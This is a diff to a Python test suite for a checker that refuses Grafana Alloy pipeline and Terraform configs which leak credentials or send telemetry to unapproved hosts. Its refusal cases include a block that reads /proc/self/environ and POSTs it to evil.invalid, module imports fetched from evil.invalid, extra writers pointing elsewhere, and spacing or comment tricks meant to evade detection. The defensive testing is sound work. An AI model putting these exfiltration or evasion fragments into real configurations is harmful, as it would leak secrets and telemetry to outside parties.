@@ -50,41 +50,69 @@ def _replace(old, new):
 
 
 AUTH = 'endpoint {\n\t\turl = "%s"\n' % pipelines_check.RECEIVER
+EVIL = "https://evil.invalid/push"
 
-# (name, change, rule the refusal names)
+
+def _auth(attrs):
+    """basic_auth inside the receiver's endpoint, holding attrs."""
+    return _replace(AUTH, AUTH + "\n\t\tbasic_auth {\n" + "".join("\t\t\t%s\n" % a for a in attrs) + "\t\t}\n")
+
+
+# (name, change, rule the refusal names). Each is the committed source broken one way.
 BREAKS = [
     ("a Grafana Cloud token", _append("// glc_eyJvIjoiMSJ9"), "secret"),
     ("a service-account token in a string", _replace('regex         = "andara-kafka"',
                                                      'regex         = "glsa_abc_123"'), "secret"),
     ("basic auth in a URL", _replace(pipelines_check.RECEIVER, "http://u:p@k8s-monitoring-alloy-receiver.observability.svc:9090/api/v1/metrics/write"), "secret"),
+    ("a literal password", _auth(['username = "1"', 'password = "hunter2hunter2"']), "credential"),
+    ("a password file", _auth(['username      = "1"', 'password_file = "/var/run/secrets/token"']), "credential"),
+    ("a literal bearer token", _replace(AUTH, AUTH + '\t\tbearer_token = "abc"\n'), "credential"),
+    ("a header map", _replace(AUTH, AUTH + '\t\theaders = {"Authorization" = "Bearer x"}\n'), "credential"),
     ("a templatefile call", _replace('names = ["andara-shared"]', 'names = [templatefile("x", {})]'), "templatefile"),
     ("a remote_write to Grafana Cloud", _replace(pipelines_check.RECEIVER, OTHER_URL), "remote_write"),
     ("a second remote_write endpoint", _replace(AUTH, AUTH + '\t}\n\n\tendpoint {\n\t\turl = "%s"\n' % OTHER_URL),
      "remote_write"),
-    ("a computed remote_write url", _replace('url = "%s"' % pipelines_check.RECEIVER,
-                                             'url = "http://" + "k8s-monitoring-alloy-receiver.observability.svc:9090/api/v1/metrics/write"'),
+    ("a concatenated remote_write url", _replace('url = "%s"' % pipelines_check.RECEIVER,
+                                                 'url = "http://" + "k8s-monitoring-alloy-receiver.observability.svc:9090/api/v1/metrics/write"'),
+     "remote_write"),
+    ("the receiver plus a path", _replace('url = "%s"' % pipelines_check.RECEIVER,
+                                          'url = "%s" + "/../../x"' % pipelines_check.RECEIVER), "remote_write"),
+    ("a proxy", _replace(AUTH, AUTH + '\t\tproxy_url = "http://proxy.invalid:3128"\n'), "remote_write"),
+    ("a second remote_write, its name spaced", _append('prometheus . remote_write "c" {\n\tendpoint {\n\t\turl = "%s"\n\t}\n}' % EVIL),
+     "remote_write"),
+    ("a remote_write split across lines", _append('prometheus.\nremote_write "c" {\n\tendpoint {\n\t\turl = "%s"\n\t}\n}' % EVIL),
      "remote_write"),
     ("an otelcol exporter", _append('otelcol.exporter.otlphttp "cloud" {\n\tclient {\n\t\tendpoint = "https://otlp.invalid"\n\t}\n}'),
      "writer"),
+    ("an otelcol exporter, spaced", _append('otelcol . exporter . otlphttp "c" {\n\tclient {\n\t\tendpoint = "https://otlp.invalid"\n\t}\n}'),
+     "writer"),
     ("a loki.write", _append('loki.write "cloud" {\n\tendpoint {\n\t\turl = "https://logs.invalid/loki/api/v1/push"\n\t}\n}'),
      "writer"),
-    ("sys.env of a name env-allow.txt doesn't list",
-     _replace(AUTH, AUTH + '\n\t\tbasic_auth {\n\t\t\tusername = "1"\n\t\t\tpassword = sys.env("GRAFANA_TELEMETRY_TOKEN")\n\t\t}\n'),
+    ("a loki.write with a comment in its name", _append('loki./* x */write "c" {\n\tendpoint {\n\t\turl = "https://logs.invalid/push"\n\t}\n}'),
+     "writer"),
+    ("a pyroscope.write", _append('pyroscope.write "c" {\n\tendpoint {\n\t\turl = "https://profiles.invalid"\n\t}\n}'),
+     "writer"),
+    ("a module import over http", _append('import.http "m" {\n\turl = "https://evil.invalid/mod.alloy"\n}'), "component"),
+    ("a module import from git", _append('import.git "m" {\n\trepository = "https://evil.invalid/m.git"\n\tpath       = "m.alloy"\n}'),
+     "component"),
+    ("the environment read from a file and posted",
+     _append('local.file "env" {\n\tfilename = "/proc/self/environ"\n}\n\nremote.http "out" {\n\turl    = "https://evil.invalid/"\n'
+             '\tmethod = "POST"\n\tbody   = local.file.env.content\n}'), "component"),
+    ("a top-level attribute", _append('x = 1'), "component"),
+    ("sys.env of a name env-allow.txt doesn't list", _auth(['username = "1"', 'password = sys.env("GRAFANA_TELEMETRY_TOKEN")']),
      "sys.env"),
-    ("sys.env of a computed name",
-     _replace(AUTH, AUTH + '\n\t\tbasic_auth {\n\t\t\tusername = "1"\n\t\t\tpassword = sys.env("PG_" + "PASSWORD")\n\t\t}\n'),
-     "sys.env"),
+    ("sys.env of a computed name", _auth(['username = "1"', 'password = sys.env("PG_" + "PASSWORD")']), "sys.env"),
     ("a reference alloy validate refuses", _replace("forward_to = [prometheus.relabel.shared_kafka.receiver]",
                                                     "forward_to = [prometheus.relabel.nope.receiver]"),
      "alloy validate"),
+    ("a source alloy fmt would change", _replace('\trole = "pod"', '    role = "pod"'), "alloy fmt"),
 ]
 
 # (name, change, env-allow.txt) that must still pass.
 ACCEPTS = [
     ("the committed source", lambda s: s, ""),
     ("loki.write and templatefile named in a comment", _append("// no loki.write, no templatefile(), no otelcol.exporter.otlp"), ""),
-    ("sys.env of a listed name",
-     _replace(AUTH, AUTH + '\n\t\tbasic_auth {\n\t\t\tusername = "1"\n\t\t\tpassword = sys.env("PG_MONITOR_PASSWORD")\n\t\t}\n'),
+    ("sys.env of a listed name", _auth(['username = "1"', 'password = sys.env("PG_MONITOR_PASSWORD")']),
      "PG_MONITOR_PASSWORD\n"),
 ]
 
@@ -114,6 +142,14 @@ class Check(unittest.TestCase):
                 self.assertEqual(rc, 1, out)
                 self.assertRegex(out, r"refused: .*shared-kafka\.alloy:\d+: %s: " % re.escape(rule))
 
+    def test_a_url_that_is_not_one_literal_says_so(self):
+        """The (not one string literal) branch: a raw string holding exactly the receiver is refused too."""
+        for value in ("`%s`" % pipelines_check.RECEIVER, '"%s" + "/x"' % pipelines_check.RECEIVER):
+            with self.subTest(value):
+                rc, out = self.run_on(self.source.replace('"%s"' % pipelines_check.RECEIVER, value, 1))
+                self.assertEqual(rc, 1, out)
+                self.assertIn("url (not one string literal) is not the receiver", out)
+
     def test_each_accept_passes(self):
         for name, change, allow in ACCEPTS:
             with self.subTest(name):
@@ -141,6 +177,51 @@ class Check(unittest.TestCase):
         with contextlib.redirect_stderr(io.StringIO()) as err:
             self.assertEqual(pipelines_check.main(["--dir", self.dir]), 1)
         self.assertIn("no pipeline", err.getvalue())
+
+
+PIPELINES_TF = os.path.join(pipelines_check.STACKS, "solo7dev", "pipelines.tf")
+RESOURCE_LINE = 'contents                   = file("${path.module}/../../pipelines/shared-kafka.alloy")'
+
+
+@unittest.skipUnless(HAVE_ALLOY or os.environ.get("CI"), "bin/alloy absent; make bootstrap installs it")
+class Resources(unittest.TestCase):
+    """Every grafana_fleet_management_pipeline reads one checked source with one literal file()."""
+
+    def setUp(self):
+        self.stacks = tempfile.mkdtemp()
+        self.addCleanup(shutil.rmtree, self.stacks)
+        os.mkdir(os.path.join(self.stacks, "solo7dev"))
+        with open(PIPELINES_TF) as f:
+            self.tf = f.read()
+        self.assertIn(RESOURCE_LINE, self.tf)
+
+    def run_on(self, tf):
+        with open(os.path.join(self.stacks, "solo7dev", "pipelines.tf"), "w") as f:
+            f.write(tf)
+        out = io.StringIO()
+        with contextlib.redirect_stdout(out), contextlib.redirect_stderr(io.StringIO()):
+            rc = pipelines_check.main(["--stacks", self.stacks])
+        return rc, out.getvalue()
+
+    def test_the_committed_resource_passes(self):
+        self.assertEqual(self.run_on(self.tf)[0], 0)
+
+    def test_each_break_is_refused(self):
+        heredoc = 'contents = <<-EOT\n    loki.write "cloud" {}\n  EOT'
+        breaks = [
+            ("an inline heredoc", self.tf.replace(RESOURCE_LINE, heredoc)),
+            ("a source outside pipelines/", self.tf.replace("../../pipelines/shared-kafka.alloy", "evil.alloy")),
+            ("a source that does not exist", self.tf.replace("pipelines/shared-kafka.alloy", "pipelines/nope.alloy")),
+            ("a name that is not its source's", self.tf.replace('"shared-kafka"', '"other"', 1)),
+            ("a for_each", self.tf.replace("  enabled ", "  for_each = toset([\"a\"])\n  enabled ")),
+            ("a second resource with no file()", self.tf + '\nresource "grafana_fleet_management_pipeline" "x" {\n'
+                                                           '  name     = "x"\n  contents = "prometheus.scrape \\"x\\" {}"\n}\n'),
+        ]
+        for name, tf in breaks:
+            with self.subTest(name):
+                rc, out = self.run_on(tf)
+                self.assertEqual(rc, 1, out)
+                self.assertRegex(out, r"refused: .*pipelines\.tf:\d+: terraform: ")
 
 
 class Usage(unittest.TestCase):
